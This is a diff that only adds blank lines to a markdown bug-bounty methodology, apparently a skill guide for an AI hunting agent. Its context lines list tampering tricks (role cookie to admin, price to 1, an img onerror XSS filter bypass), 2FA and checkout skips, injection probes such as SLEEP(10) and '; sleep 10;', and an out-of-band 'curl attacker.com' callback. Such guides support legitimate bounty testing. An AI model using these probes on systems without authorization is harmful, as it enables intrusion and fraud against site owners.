@@ -36,17 +36,20 @@ Before touching any tool:
 #### 1. Critical Thinking (deep analysis)
 
 **Question trust boundaries:**
+
 - Frontend control disabled? Send request directly via proxy
 - `user_role=user` cookie? Change to `admin`
 - `price=1000` in POST? Change to `1`
 - `<script>` blocked? Try `<img onerror=...>`
 
 **Reverse-engineer developer psychology:**
+
 - Feature A has auth checks -> Similar feature B (newly added) probably doesn't
 - Complex flows (coupon + points + refund) -> Edge cases have bugs
 - `/api/v2/user` exists -> Does `/api/v1/user` still work with weaker auth?
 
 **What-If experiments:**
+
 - Skip checkout -> hit `/checkout/success` directly
 - Skip 2FA -> navigate to `/dashboard`
 - Send coupon request 10x simultaneously -> Race condition?
@@ -151,11 +154,13 @@ Before touching any tool:
 **Goal**: Maximize attack surface. Find what others missed.
 
 **Wide approach** (initial sweep):
+
 ```
 Subdomain enum -> DNS resolution -> HTTP probing -> Port scan -> Tech detect
 ```
 
 **Deep approach** (targeted):
+
 ```
 Google Dorks -> JS file download -> Hidden param discovery -> API mapping
 ```
@@ -174,6 +179,7 @@ Google Dorks -> JS file download -> Hidden param discovery -> API mapping
 **Goal**: Understand the app like its developer does.
 
 **Checklist:**
+
 - [ ] Map all endpoints (Burp/Caido sitemap + JS analysis)
 - [ ] Identify auth model (cookie, JWT, OAuth, SAML?)
 - [ ] Find business-critical flows (payment, registration, password reset, data export)
@@ -220,6 +226,7 @@ What input are you testing?
 ```
 
 **Error vs Blind decision:**
+
 1. Try Error-based first (send `'`, `"`, `{{7*7}}`, `${7*7}`) -- watch for 500 errors, stack traces
 2. No error? Time-based (`SLEEP(10)`, `; sleep 10;`) -- watch response time
 3. No time diff? OOB (`curl attacker.com`, interactsh) -- watch for DNS callback
@@ -238,6 +245,7 @@ What input are you testing?
 **Goal**: Prove maximum business impact. Turn Low into Critical.
 
 **Escalation decision:**
+
 ```
 What did you find?
 +-- XSS
@@ -266,6 +274,7 @@ What did you find?
 ```
 
 **After proving impact, check:**
+
 - [ ] Can attack work with 0-1 clicks? (minimize prerequisites)
 - [ ] Does it affect all users or specific role?
 - [ ] What's the business $ impact?
@@ -275,6 +284,7 @@ What did you find?
 **Goal**: Get paid. Make triager's job easy.
 
 **Pre-report gate:**
+
 ```
 Run /validate (7-Question Gate)
 +-- All 7 pass? -> Write report
@@ -283,6 +293,7 @@ Run /validate (7-Question Gate)
 ```
 
 **Report:**
+
 ```
 Run /report
 +-- Platform-specific format (H1/Bugcrowd/Intigriti/Immunefi)
@@ -294,6 +305,7 @@ Run /report
 ```
 
 **After submission:**
+
 - [ ] While waiting for triage: try to escalate further (A->B signal method)
 - [ ] If fix deployed: re-test for bypass (incomplete patch = new bug)
 - [ ] Record finding with `/remember` for hunt memory
@@ -318,6 +330,7 @@ Run /report
 ### 20-Minute Rotation Clock
 
 Every 20 minutes ask yourself: **"Am I making progress?"**
+
 - Yes -> Continue
 - No -> Rotate to next: endpoint -> subdomain -> vuln class -> target
 - Been on same target 2+ weeks with no findings? -> Consider switching program
